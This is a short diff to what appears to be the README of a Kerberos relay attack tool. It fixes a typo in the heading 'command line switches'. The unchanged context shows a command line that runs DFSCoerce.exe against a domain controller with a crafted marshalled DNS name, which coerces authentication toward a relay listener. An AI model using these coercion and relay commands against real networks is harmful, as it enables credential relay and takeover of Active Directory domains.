@@ -24,7 +24,7 @@ In another window:
 DFSCoerce.exe -l adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  -t DC-2
 (https://github.com/decoder-it/DFSCoerce-exe-2)
 
-# special command line swicthes:
+# special command line switches:
 -listener: relay listener port
 -redirector: relay server/redirector  mapped to the sepcial DNS entry <server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
 For detailed usage and command line switches refer to original krbleay tool
